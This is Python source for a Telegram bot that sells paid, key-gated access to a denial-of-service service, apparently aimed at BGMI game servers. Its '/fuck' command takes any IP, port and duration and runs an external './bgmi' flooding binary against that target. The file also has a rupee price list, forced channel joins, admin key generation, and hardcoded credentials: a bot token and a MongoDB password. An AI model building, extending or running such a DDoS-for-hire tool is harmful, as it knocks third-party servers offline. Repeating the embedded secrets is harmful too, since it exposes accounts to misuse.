import telegram
from telegram.ext import Application, CommandHandler, CallbackQueryHandler
import time
import datetime
import secrets
import sqlite3
import asyncio
import logging
import ipaddress
import threading
import subprocess
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from pymongo import MongoClient
from telegram import Update
from telegram.ext import CallbackContext

# Replace with your actual bot token and admin user ID
BOT_TOKEN = '8002903145:AAFIDE8eRm1vLBrr8elJbs76WlB8IFsgAwc'
ADMIN_USER_ID = 5613725800
CHANNEL_USERNAME = '@DDOSMOD'

# MongoDB Connection
client = MongoClient("mongodb+srv://Rues:xhHopNbDUd6YjXZi@rues.n5arx.mongodb.net/")
db = client["premium_bot"]
users_collection = db["users"]
keys_collection = db["keys"]

# Logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
blocked_ports = [8700, 20000, 17500, 9031, 20002, 20001]

def create_join_keyboard():
    """Create inline keyboard for joining the channel."""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🤝 𝗝𝗢𝗜𝗡 𝗛𝗘𝗥𝗘", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")],
        [InlineKeyboardButton("✅ 𝗝𝗢𝗜𝗡𝗘𝗗 ", callback_data="check_join")]
    ])
    
async def is_user_member(user_id, context):
    """Check if the user is a member of the channel."""
    try:
        chat_member = await context.bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return chat_member.status in ['member', 'administrator', 'creator']
    except:
        return False  # If error occurs, assume user is not a member

async def start(update, context):
    """Handles the /start command and forces users to join the channel."""
    user = update.message.from_user
    user_id = user.id

    try:
        chat_member = await context.bot.get_chat_member(CHANNEL_USERNAME, user_id)
        if chat_member.status in ['member', 'administrator', 'creator']:
            await update.message.reply_text(
                f"🔥 *Welcome, {user.first_name}! \nYOU ARE ALREADY JOINED MY TELEGRAM CHANNEL THANKS BROTHER LOVE YOU ❤\nPLESE SHARE MY BOT TO YOUR FRIENDS FOR KEY 🔑*",
                parse_mode='Markdown', reply_markup=create_inline_keyboard())
            
        else:
            raise Exception("User not in channel")
    except:
        await update.message.reply_text(
            "🚨 *BHAI FIRST JOIN MY CHANNEL \nBECAUSE YHA PAR DAILY KEY MILEGA GIVEAWAY HOGA* ",parse_mode='Markdown', 
            reply_markup=create_join_keyboard()
        )

async def check_join(update, context):
    """Checks if the user has joined the channel after clicking the '✅ Joined' button."""
    query = update.callback_query
    user_id = query.from_user.id

    try:
        chat_member = await context.bot.get_chat_member(CHANNEL_USERNAME, user_id)
        if chat_member.status in ['member', 'administrator', 'creator']:
            await query.message.edit_text("✅* 𝗧𝗛𝗔𝗡𝗞𝗦 𝗝𝗔𝗡𝗨\n\n𝗬𝗢𝗨 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟 𝗝𝗢𝗜𝗡𝗘𝗗 𝗠𝗬 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗡𝗢𝗪 𝗬𝗢𝗨 𝗖𝗔𝗡 𝗨𝗦𝗘 𝗠𝗬 𝗕𝗢𝗧 𝗟𝗘𝗧'𝗦 𝗙𝗨𝗖𝗞 *",parse_mode='Markdown',reply_markup=create_inline_keyboard())
        else:
            await query.answer("❌ 𝗞𝗬𝗔 𝗕𝗛𝗔𝗜 𝗝𝗢𝗜𝗡 𝗞𝗥 𝗡𝗔 𝗜𝗧𝗡𝗔 𝗧𝗢 𝗞𝗥𝗡𝗔 𝗣𝗔𝗗𝗘𝗚𝗔 𝗡𝗔 𝗙𝗥𝗘𝗘 𝗗𝗗𝗢𝗦 𝗞 𝗟𝗜𝗬𝗘", show_alert=True)
    except:
        await query.answer("❌ Error checking your membership. Try again.", show_alert=True)

def create_inline_keyboard():
    markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("❤‍🩹 𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 ❤‍🩹", url="https://t.me/DDOSMOD")],
        [InlineKeyboardButton("👤 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘄𝗻𝗲𝗿 👤", url="https://t.me/DDOSMOD_OWNER")]
    ])
    return markup

def create_database():
    conn = sqlite3.connect("users.db") # Corrected database file name
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            approved_until INTEGER,
            redeemed_keys TEXT
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS keys (
            key TEXT PRIMARY KEY,
            hours INTEGER
        )
    ''')
    conn.commit()
    conn.close()

create_database()

def is_approved(user_id):
    user = users_collection.find_one({"user_id": user_id})
    if user and user.get("approved_until") and user["approved_until"] > time.time():
        return True
    return False

def approve_user(user_id, hours):
    approved_until = int(time.time() + hours * 3600)
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"approved_until": approved_until}},
        upsert=True
    )

def disapprove_user(user_id):
    users_collection.delete_one({"user_id": user_id})

import datetime
import pytz

def get_user_info(user_id):
    user = users_collection.find_one({"user_id": user_id})
    if user:
        approved_until = user.get("approved_until")
        redeemed_keys = user.get("redeemed_keys", [])

        if approved_until:
            # Convert timestamp to IST
            ist = pytz.timezone('Asia/Kolkata')
            approved_datetime = datetime.datetime.fromtimestamp(approved_until, pytz.utc).astimezone(ist)
            approved_until_str = approved_datetime.strftime('%Y-%m-%d %H:%M:%S')
        else:
            approved_until_str = "Not Approved"

        return f"📅 Account Status: {approved_until_str}\n💎 Redeemed Keys: {', '.join(redeemed_keys) if redeemed_keys else 'None'}"
    
    return "User not found."


def create_redeem_key(hours):
    key = secrets.token_hex(16)
    keys_collection.insert_one({
        "key": key,
        "hours": hours,
        "valid_until": (datetime.datetime.now() + datetime.timedelta(hours=hours)).strftime("%Y-%m-%d %H:%M:%S")
    })
    return key

def redeem_key(user_id, key):
    key_data = keys_collection.find_one({"key": key})
    if key_data:
        hours = key_data["hours"]
        approve_user(user_id, hours)
        keys_collection.delete_one({"key": key})
        users_collection.update_one(
            {"user_id": user_id},
            {"$push": {"redeemed_keys": key}},
            upsert=True
        )
        return True
    return False

async def check_user_approvals(context: telegram.ext.CallbackContext):
    now = time.time()
    expired_users = users_collection.find({"approved_until": {"$lt": now}})
    for user in expired_users:
        user_id = user["user_id"]
        disapprove_user(user_id)
        try:
            await context.bot.send_message(chat_id=user_id, text="💸 *Your Key expired brother*", parse_mode='Markdown',reply_markup=create_inline_keyboard() )
            await context.bot.send_message(chat_id=ADMIN_USER_ID, text=f"🛑 *User {user_id}'s session expired.*", parse_mode='Markdown',reply_markup=create_inline_keyboard())
        except Exception as e:
            logging.error(f"Error sending expiration message: {e}")

async def delete_expired_keys(context: telegram.ext.CallbackContext):
    now = datetime.datetime.now()
    keys_collection.delete_many({"valid_until": {"$lt": now.strftime("%Y-%m-%d %H:%M:%S")}})

async def ping(update, context):
    start = time.time()
    message = await update.message.reply_text("*🏓 Pinging the server...*\n*🌐 Please hold on, checking connection speed...*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
    end = time.time()
    latency = round((end - start) * 1000, 2)
    await message.edit_text(f"*🏓 PONG!*\n⚡ *Server Response Time:* `{latency}ms`\n✅ *Connection Stable: Performance optimized for quick responses!*\n🚀 *Ready to assist you anytime!*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
    
start_time = time.time() 
async def uptime(update, context):
    global start_time
    uptime_seconds = int(time.time() - start_time)
    days = uptime_seconds // 86400
    hours = (uptime_seconds % 86400) // 3600
    minutes = (uptime_seconds % 3600) // 60
    seconds = uptime_seconds % 60
    await update.message.reply_text(f"*⏱️ BOT UPTIME ⏱️*\n📅 *Running For: {days} days, {hours} hours, {minutes} minutes, {seconds} seconds*\n💪 *Status: Online & Fully Operational*\n⚡ *Ready to assist you anytime!*\n🚀 *Powered for performance and reliability!*", parse_mode='Markdown', reply_markup=create_inline_keyboard())

async def price(update, context):
    await update.message.reply_text("*🔴 PRICE LIST 🔴*\n\n*🛒 1 Day - 99 ₹/-*\n*🛒 1 Week - 299 ₹/-*\n*🛒 1 Month - 499 ₹/-*\n*🛒 1 Season - 799 ₹/-*\n\n*💳 TO PURCHASE OR GET MORE INFORMATION, CONTACT : @DDOSMOD_OWNER*", parse_mode='Markdown', reply_markup=create_inline_keyboard())

attack_in_progress = False
attack_start_time = 0
attack_duration = 0

async def bgmi(update, context):
    global attack_in_progress, attack_start_time, attack_duration
    user_id = update.message.from_user.id
    chat_id = update.message.chat.id

    # Check if user has joined the channel
    if not await is_user_member(user_id, context):
        await update.message.reply_text(
            "🚨 *BHAI CHANNEL JOIN KRO YAR TABHI BOT USE KR PAAOGE * 🚨",
            parse_mode='Markdown', reply_markup=create_join_keyboard()
        )
        return

    # Check if the user is approved
    if not is_approved(user_id):
        await update.message.reply_text(
            "*🚫 ACCESS DENIED 🚫\nYou lack the authorization to initiate this command.\n🔒 Kindly seek approval to unlock this feature.*", 
            parse_mode='Markdown', reply_markup=create_inline_keyboard()
        )
        return

    # Check if an attack is already running
    if attack_in_progress:
        remaining_time = attack_duration - (time.time() - attack_start_time)
        if remaining_time > 0:
            await update.message.reply_text(
                f"*⚠️ SYSTEM ALERT ⚠️\nThe bot is currently engaged in an ongoing operation.\n⏳ Remaining Time: {int(remaining_time)} seconds\n💥 Please wait before starting another command.*", 
                parse_mode='Markdown', reply_markup=create_inline_keyboard()
            )
        else:
            attack_in_progress = False
            await update.message.reply_text(
                "*✅ OPERATION COMPLETE ✅\nThe previous attack has concluded successfully.\n🔥 You can now start a new operation.*", 
                parse_mode='Markdown', reply_markup=create_inline_keyboard()
            )
        return

    # Validate input parameters
    if len(context.args) != 3:
        await update.message.reply_text(
            "*❗ INVALID USAGE ❗\nCorrect Syntax: /fuck <ip> <port> <duration>\n💡 Example: /fuck 192.168.1.1 8080 120\nEnsure all parameters are correctly formatted.*", 
            parse_mode='Markdown', reply_markup=create_inline_keyboard()
        )
        return

    ip_str, port_str, duration_str = context.args

    try:
        ipaddress.ip_address(ip_str)
        port = int(port_str)
        duration = int(duration_str)

        if port in blocked_ports:
            await update.message.reply_text(
                f"*⛔ OPERATION REJECTED ⛔\nReason: Port {port} is restricted and cannot be used.\n🔒 Please select an alternative port.*", 
                parse_mode='Markdown', reply_markup=create_inline_keyboard()
            )
            return

        if duration > 280:
            await update.message.reply_text(
                "*⏱️ DURATION LIMIT EXCEEDED ⏱️\nMaximum allowed duration: 280 seconds\n⚡ Kindly adhere to the permitted timeframe.*", 
                parse_mode='Markdown', reply_markup=create_inline_keyboard()
            )
            return

        await update.message.reply_text(
            f"*💥 ATTACK LAUNCHED 💥\n🔫 Target: {ip_str}\n💣 Port: {port}\n⏳ Duration: {duration} seconds\n🚀 The attack is now underway — brace for impact!*", 
            parse_mode='Markdown', reply_markup=create_inline_keyboard()
        )

        attack_in_progress = True
        attack_start_time = time.time()
        attack_duration = duration

        asyncio.create_task(run_bgmi_command(update, context, ip_str, port, duration))

    except ValueError as e:
        await update.message.reply_text(
            f"*❌ INPUT ERROR ❌\nInvalid value provided: {e}\n💡 Ensure that the IP, port, and duration are correctly specified.*", 
            parse_mode='Markdown', reply_markup=create_inline_keyboard()
        )
    except Exception as e:
        logging.error(f"Error in bgmi command: {e}")
        await update.message.reply_text(
            "*⚠️ SYSTEM FAILURE ⚠️\nAn unexpected error occurred during the operation.\n🔁 Please try again later or contact support.*", 
            parse_mode='Markdown', reply_markup=create_inline_keyboard()
        )


async def run_bgmi_command(update, context, ip, port, duration):
    global attack_in_progress
    try:
        process = await asyncio.create_subprocess_shell(f"./bgmi {ip} {port} {duration} 200")
        await process.communicate()

        if process.returncode == 0:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"*✅ OPERATION SUCCESSFUL ✅\n💥 The attack has been executed with precision.\n🎯 Target Neutralized: {ip}\n🚀 Duration: {duration} seconds\n💣 Port: {port}\n🔥 Mission Accomplished! Thank you for using our service.*",
                parse_mode='Markdown', reply_markup=create_inline_keyboard()
            )
            logging.info(f"BGMI command finished successfully.")
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="*❌ OPERATION FAILED ❌\n⚠️ The attack encountered an unexpected issue.\n💡 Please verify the input parameters and retry.*",
                parse_mode='Markdown', reply_markup=create_inline_keyboard()
            )
            logging.error(f"BGMI command failed with return code {process.returncode}")

    except FileNotFoundError:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⛔ SYSTEM ERROR ⛔\n🔎 Binary file ./bgmi not found.\n💡 Ensure the file is correctly placed and has executable permissions.*",
            parse_mode='Markdown', reply_markup=create_inline_keyboard()
        )
        logging.error("Binary file './bgmi' not found.")

    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"*⚠️ EXECUTION ERROR ⚠️\n❗ An unexpected error occurred during command execution: {e}\n🔁 Please try again or contact support.*",
            parse_mode='Markdown', reply_markup=create_inline_keyboard()
        )
        logging.error(f"Error running BGMI command: {e}")
    finally:
        attack_in_progress = False


async def redeem(update, context):
    if len(context.args) != 1:
        await update.message.reply_text("*⚠️ INVALID USAGE ⚠️\n💡 Correct Format: /redeem <key>\n🔑 Example: /redeem ABCD-1234-EFGH\n💡 Use a valid key to unlock premium features.*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
        return

    key = context.args[0]
    if redeem_key(update.message.from_user.id, key):
        await update.message.reply_text("*✅ KEY REDEEMED SUCCESSFULLY ✅\n🔓 Premium access has been unlocked.\n💥 Enjoy all features without limits!*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
    else:
        await update.message.reply_text("*❌ INVALID KEY ❌\n⚠️ The provided key is incorrect or expired.\n💡 Please verify and try again.*", parse_mode='Markdown', reply_markup=create_inline_keyboard())

async def info(update, context):
    user_info = get_user_info(update.message.from_user.id)
    await update.message.reply_text(f"*ℹ️ USER INFORMATION ℹ️\n👤 User ID: *`{update.message.from_user.id}`\n📅 *Account Status: *`{user_info.splitlines()[0].split(': ')[1]}`\n💎 *Redeemed Keys: *`{user_info.splitlines()[1].split(': ')[1]}`\n💡 *Use /price to check upgrade options.*", parse_mode='Markdown', reply_markup=create_inline_keyboard())

async def key(update, context):
    if update.message.from_user.id != ADMIN_USER_ID:
        await update.message.reply_text("*⛔ ACCESS DENIED ⛔\n⚠️ This command is only available to administrators.*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
        return

    if len(context.args) != 1:
        await update.message.reply_text("*⚠️ INVALID USAGE ⚠️\n💡 Correct Format: /key <hours>\n🔑 Example: /key 24\n💡 Generates a redeem key valid for the specified duration.*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
        return

    hours = int(context.args[0])
    new_key = create_redeem_key(hours)
    await update.message.reply_text(f"*✅ NEW REDEEM KEY CREATED ✅\n🔑 Key:* `{new_key}`\n⏱️ *Validity: {hours} hours\n💡 Share this key with users to grant access.*", parse_mode='Markdown', reply_markup=create_inline_keyboard())

async def approve(update, context):
    if update.message.from_user.id != ADMIN_USER_ID:
        await update.message.reply_text("*⛔ ACCESS DENIED ⛔\n⚠️ This command is only available to administrators.*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
        return

    if len(context.args) != 2:
        await update.message.reply_text("*⚠️ INVALID USAGE ⚠️\n💡 Correct Format: /approve <user_id> <hours>\n👤 Example: /approve 123456789 48\n💡 Grants the specified user premium access for a set duration.*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
        return

    user_id, hours = int(context.args[0]), int(context.args[1])
    approve_user(user_id, hours)
    await update.message.reply_text(f"*✅ USER APPROVED ✅\n👤 User ID: `{user_id}`\n⏱️ Validity: `{hours}` hours\n💎 Premium features have been unlocked for the user.*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
    await context.bot.send_message(chat_id=user_id, text=f"*💎 CONGRATULATIONS! 💎\n✅ Your account has been approved for premium access.\n⏱️ Validity: {hours} hours\n🔥 Enjoy unlimited features and faster performance!*", parse_mode='Markdown', reply_markup=create_inline_keyboard())

async def users(update, context):
    count = users_collection.count_documents({})
    await update.message.reply_text(f"*👥 TOTAL USERS 👥\n📊 Registered Users: {count}\n💡 Stay connected and grow your community!*", parse_mode='Markdown', reply_markup=create_inline_keyboard())

async def broadcast(update, context):
    if update.message.from_user.id != ADMIN_USER_ID:
        await update.message.reply_text("*⛔ ACCESS DENIED ⛔\n⚠️ This command is only available to administrators.*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
        return
    message = ' '.join(context.args)
    if not message:
        await update.message.reply_text("*⚠️ INVALID USAGE ⚠️\n💡 Correct Format: /broadcast <message>\n💬 Example: /broadcast System maintenance at 10 PM.\n💡 Sends the message to all registered users.*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
        return

    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    cursor.execute('SELECT user_id FROM users')
    users = cursor.fetchall()
    conn.close()

    sent_count, failed_count = 0, 0
    for user_id in users:
        try:
            await context.bot.send_message(chat_id=user_id[0], text=message)
            sent_count += 1
        except Exception as e:
            failed_count += 1
            logging.error(f"Failed to send message to {user_id[0]}: {e}")
    await update.message.reply_text(f"*📢 BROADCAST COMPLETED 📢*", parse_mode='Markdown', reply_markup=create_inline_keyboard())

async def help_command(update, context):
    user_commands = """*💡 AVAILABLE COMMANDS 💡\n- /ping - Check bot latency. 🏓\n- /uptime - Check bot uptime. ⏱️\n- /price - Show price list. 💲\n- /fuck <ip> <port> <duration> - Start fuck server. 🔥\n- /redeem <key> - Redeem a key. 🔑\n- /info - Show your account information. ℹ️*"""
    admin_commands = """*\n\n👑 ADMIN COMMANDS 👑\n- /key <hours> - Create redeem key. 🗝️\n- /approve <user_id> <hours> - Approve a user. ✅\n- /users - Check total users. 👥\n- /broadcast <message> - Send a message to all users. 📢*"""
    if update.message.from_user.id == ADMIN_USER_ID:
        await update.message.reply_text(user_commands + "\n" + admin_commands, parse_mode='Markdown', reply_markup=create_inline_keyboard())
    else:
        await update.message.reply_text(user_commands, parse_mode='Markdown', reply_markup=create_inline_keyboard())

# Add the forced join feature into the bot's command handlers
def main():
    application = Application.builder().token(BOT_TOKEN).build()

    # Add handlers for commands
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(check_join, pattern="check_join"))

    # Add other existing bot commands (unchanged)
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("ping", ping))
    application.add_handler(CommandHandler("uptime", uptime))
    application.add_handler(CommandHandler("price", price))
    application.add_handler(CommandHandler("fuck", bgmi))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("info", info))
    application.add_handler(CommandHandler("key", key))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("users", users))
    application.add_handler(CommandHandler("broadcast", broadcast))

    # Job queue for periodic tasks
    job_queue = application.job_queue
    job_queue.run_repeating(check_user_approvals, interval=60, first=0)
    job_queue.run_repeating(delete_expired_keys, interval=300, first=0)

    application.run_polling()

if __name__ == '__main__':
    main()
